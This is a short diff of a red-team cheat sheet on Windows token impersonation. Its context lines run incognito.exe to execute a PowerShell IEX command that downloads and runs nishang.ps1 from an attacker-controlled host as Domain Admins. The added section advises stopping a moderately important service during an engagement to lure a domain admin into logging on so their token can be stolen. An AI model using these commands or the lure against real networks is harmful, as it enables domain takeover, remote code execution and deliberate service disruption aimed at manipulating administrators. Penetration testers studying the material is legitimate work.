@@ -16,3 +16,8 @@ incognito.exe execute LAB\Administrator "powershell IEX(New-Object Net.webClient
 ```shell
 incognito.exe execute "LAB\Domain Admins" "powershell IEX(New-Object Net.webClient).downloadString('http://<ATTACKER_IP>/nishang.ps1')"
 ```
+
+# Tricks:
+*in an engagment,* if you have access to an important server and want to lure a domain admin to login, you might stop a service that's not too critical. this will make him/her eventually come over to take care of it.
+
+you can think of other creative ways to entice a domain admin to log on to the server.
